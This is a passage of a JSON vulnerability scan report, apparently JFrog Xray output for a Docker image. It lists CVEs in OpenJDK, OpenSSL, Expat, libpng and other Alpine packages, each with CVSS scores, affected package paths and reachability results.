                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2 and  22; Oracle GraalVM Enterprise Edition: 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21068",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-04-25T00:00:00.661Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21068",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-608309",
                    "summary": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
                    "description": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0215",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0215",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable functions is called:</p>\n<pre><code>PEM_write_bio_ASN1_stream()\nPEM_write_bio_CMS_stream()\nPEM_write_bio_PKCS7_stream()\nSMIME_write_ASN1()\nSMIME_write_CMS()\nSMIME_write_PKCS7()\nBIO_new_CMS()\nBIO_new_PKCS7()\ni2d_CMS_bio_stream()\ni2d_PKCS7_bio_stream()\ni2d_ASN1_bio_stream()\nBIO_new_NDEF()\n</code></pre>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0215",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable functions is called:</p>\n<pre><code>PEM_write_bio_ASN1_stream()\nPEM_write_bio_CMS_stream()\nPEM_write_bio_PKCS7_stream()\nSMIME_write_ASN1()\nSMIME_write_CMS()\nSMIME_write_PKCS7()\nBIO_new_CMS()\nBIO_new_PKCS7()\ni2d_CMS_bio_stream()\ni2d_PKCS7_bio_stream()\ni2d_ASN1_bio_stream()\nBIO_new_NDEF()\n</code></pre>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0215",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0215",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-678575",
                    "summary": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the localrealm variable in the process_v4 function.",
                    "description": "Buffer overflow in Kerberos 4 KDC program allows remote attackers to cause a denial of service via the localrealm variable in the process_v4 function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2000-0547",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P"
                        }
                    ],
                    "created": "2025-03-23T00:00:00.584Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2000-0547",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100500",
                    "summary": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption problem caused by the cplus_demangle_type function making recursive calls to itself in certain scenarios involving many 'P' characters.",
                    "description": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption problem caused by the cplus_demangle_type function making recursive calls to itself in certain scenarios involving many 'P' characters.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-17985",
                            "cwe": [
                                "CWE-400"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-12T00:00:00.772Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-17985",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-193947",
                    "summary": "In doProlog in xmlparse.c in Expat (aka libexpat) before 2.4.3, an integer overflow exists for m_groupSize.",
                    "description": "In doProlog in xmlparse.c in Expat (aka libexpat) before 2.4.3, an integer overflow exists for m_groupSize.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-46143",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-09T00:00:00.271Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-46143",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194159",
                    "summary": "defineAttribute in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "defineAttribute in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22824",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-11T00:00:00.932Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22824",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22824",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195072",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21341",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.015Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21341",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-594241",
                    "summary": "A heap overflow flaw was found in libpngs' pngimage.c program. This flaw allows an attacker with local network access to pass a specially crafted PNG file to the pngimage utility, causing an application to crash, leading to a denial of service.",
                    "description": "A heap overflow flaw was found in libpngs' pngimage.c program. This flaw allows an attacker with local network access to pass a specially crafted PNG file to the pngimage utility, causing an application to crash, leading to a denial of service.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-4214",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-03-21T00:00:00.360Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libpng:1.6.37-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-4214",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100603",
                    "summary": "The get_count function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31, allows remote attackers to cause a denial of service (malloc called with the result of an integer-overflowing calculation) or possibly have unspecified other impact via a crafted string, as demonstrated by c++filt.",
                    "description": "The get_count function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31, allows remote attackers to cause a denial of service (malloc called with the result of an integer-overflowing calculation) or possibly have unspecified other impact via a crafted string, as demonstrated by c++filt.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-18483",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.8/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-06-14T00:00:00.149Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-18483",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187946",
                    "summary": "Vulnerability in the Java SE product of Oracle Java SE (component: Deployment). The supported version that is affected is Java SE: 8u301. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).",
                    "description": "Vulnerability in the Java SE product of Oracle Java SE (component: Deployment). The supported version that is affected is Java SE: 8u301. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35560",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.1/CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.634Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35560",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198615",
                    "summary": "In Expat (aka libexpat) before 2.4.5, there is an integer overflow in storeRawNames.",
                    "description": "In Expat (aka libexpat) before 2.4.5, there is an integer overflow in storeRawNames.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-25315",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-02-22T00:00:00.751Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-25315",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-25315",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-252176",
                    "summary": "A logic error was found in the libmount library of util-linux in the function that allows an unprivileged user to unmount a FUSE filesystem. This flaw allows an unprivileged local attacker to unmount FUSE filesystems that belong to certain other users who have a UID that is a prefix of the UID of the attacker in its string form. An attacker may use this flaw to cause a denial of service to applications that use the affected filesystems.",
                    "description": "A logic error was found in the libmount library of util-linux in the function that allows an unprivileged user to unmount a FUSE filesystem. This flaw allows an unprivileged local attacker to unmount FUSE filesystems that belong to certain other users who have a UID that is a prefix of the UID of the attacker in its string form. An attacker may use this flaw to cause a denial of service to applications that use the affected filesystems.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-3995",
                            "cwe": [
                                "CWE-552"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-08-24T00:00:00.867Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libuuid:2.33.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-3995",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514966",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
